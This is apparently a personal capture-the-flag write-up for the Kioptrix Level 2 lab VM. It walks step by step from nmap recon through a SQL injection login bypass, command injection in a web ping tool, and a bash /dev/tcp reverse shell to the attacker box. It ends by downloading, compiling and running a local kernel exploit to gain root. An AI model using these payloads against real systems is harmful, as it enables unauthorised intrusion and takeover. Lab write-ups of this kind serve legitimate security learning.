# Objective for this Task - 
Gain Root access to a CentOS box.

# Helpful Information (Post Completion) -
- Kali IP : 10.0.2.15
- CentOS IP : 10.0.2.4
- Commands are identified by $ at the beggining
--- --- --- 

# Kioptrix 2 
How to complete it

# Reconnisance
Firstly off the bat, we want to find the IP of the local device (Kali Box). 
``` 
$ ifconfig 
```

By doing this we should see the local device IP, as well as the loopback address.
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fe80::a00:27ff:fe0e:348d  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:0e:34:8d  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 2694 (2.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 15  bytes 1390 (1.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 400 (400.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 400 (400.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Since we now know the IP address, NMAP is our best friend! 
We want to hit NMAP with our IP address (10.0.2.15), with the subnetmask on the end (/24), this ensures NMAP scans the entire Subnet for other devices on the 10.0.2.X network.
```
$ nmap 10.0.2.15/24
```

This will show us all the IP addresses as well as open ports on the subnet, this will help us in the next part which is very helpful in finding the target machine. 
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 13:20 EDT
Nmap scan report for 10.0.2.1
Host is up (0.00063s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
53/tcp open  domain

Nmap scan report for 10.0.2.4
Host is up (0.00076s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
3306/tcp open  mysql

Nmap scan report for 10.0.2.15
Host is up (0.00063s latency).
All 1000 scanned ports on 10.0.2.15 are closed

Nmap done: 256 IP addresses (3 hosts up) scanned in 3.17 seconds
```

Here we can do some deducting, 10.0.2.1 only has Port 53 open, which isn't overly useful. 10.0.2.4 is looking much better, as it appears to be hosting something due to Port 443 (HTTPS) being open, which indicates to me that there is a Website running on it. It also has Port 3306 (MySQL) which is vulnerable to SQLI exploits, so it'll be good to test this out. 
```
10.0.2.4/index.php
```

So this Webpage has a very basic log-in prompt, and we can see from sending through a test Login with the Username (Admin) it shows it is returning from a database with the POST / GET interactions.

From the source, we can also see that it is running 
```Apache/2.0.52 (CentOS)``` which can be super helpful in exploting this machine.

# Exploitation
Since in recon we saw that this device has MySQL ports open, it would be a good starting point to try SQLI on the login fields. For this we will use any Username we desire, although I use Admin. 

SQLI will require us to put the following code into the password field, this code will trick SQL into thinking that this is the correct password granting us access. 
``` ' OR '1'='1 ```

Now that we're into the system, we need to figure out what we can explot further in here, we're met with a "Ping" search, where the User can input any IP and recieve the Ping results in the browser. 

However, upon doing a test ping, you will notice that the results look identical to if you did a ping on your devices local terminal. Comparision below.

Kali Box 8.8.8.8 ping
```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=55 time=15.4 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=55 time=13.7 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=55 time=17.7 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=55 time=12.9 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3009ms
rtt min/avg/max/mdev = 12.913/14.936/17.688/1.823 ms
```

Website Tool 8.8.8.8 ping
```
8.8.8.8

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=0 ttl=55 time=15.2 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=55 time=12.9 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=55 time=16.0 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 12.901/14.710/16.016/1.324 ms, pipe 2
```

This means that it is running through a bash terminal on the backend, which means that we can ask the first request (the ping) but with a ; on the end of the reuqest, we can start a new request.

The Request
```8.8.8.8; ls```

The Result
```8.8.8.8; ls

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=0 ttl=55 time=17.7 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=55 time=15.7 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=55 time=14.6 ms

--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 14.607/16.036/17.729/1.292 ms, pipe 2
index.php
pingit.php
```

You can see that the request went through as planned, showing the 'ls' request on the end of it, as the bottom. This means that we can attempt to get access through this using a reverse shell. 

For the reverse shell to work, we will need to use netcat to listen on Port 443 on our Kali box, using this command. 
```$ nc -lvnp 443```

Then we will pass this through the web app to open the reverse shell.
```;bash -i >& /dev/tcp/10.0.2.15/443 0>&1```

You will now notice that the Kali box command prompt, should allow you to write directly to the server now, as you have just created a reverse shell conntaction. Test this out by running 
```$ whoami```

This should show you that you're the user Apache, which is infact the account on the Kioptrix Server, you can check what you're on by using the following command. 
```
$ -uname a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```

Now that we know we're on the Kioptrix server, we can do one final thing and check the version of Linux that this machine is running. To do this we can use 
```
$ cat /etc/*elease
CentOS release 4.5 (Final)
```

# Privilege Escalation
We can now use all of this information to look for exploits on Exploit-DB relating to this version of Linux. 

Upon looking at https://www.exploit-db.com/exploits/9542 we can see that there is a valid exploit for CentOS 4.5. Take note of the EDB-ID and head back to your Kali terminal. Here you want to type in the following 
```$ searchsploit -m 9542```

This will save the exploit to your ```/home/kali/``` where you can then compile it via GCC compiling tool on Kali. You can do this by using the following command.

! Note - If you have troubles compiling the Exploit, use this to download the correct librarys on your Linux box ```$ sudo apt-get install gcc-multilib  ```
```$ gcc -m32 -Wl,--hash-style=both 9542.c -o 9542 ```

This will then compile it into a new file without the .c on the end, this means it's working and that it will work when placed on the other Kioptrix box.

Now have have to figure out how to get it onto the Kioptrix box.

On the Kali box, we want to run to open a temporary HTTP server, so we can transfer the files across to the Kioptrix server.
```$ python -m SimpleHTTPServer```

Now that we have a server set-up, we go back over to the Kioptrix terminal. First we need to get into a directory in which Apache can write and execute in, this can be achived by going to 
``` 
$ cd tmp
```
Once in TMP we can chuck in the following commands, which should get us access to root!
```
$ wget 10.0.2.15:8000/9542
$ chmod +x 9542
$ ./9542
sh: no job control in this shell
# whoami
root
```

We're in, we're all sorted and now we're onto the next :^) 

### Disclaimer
These notes are for my own learning process.
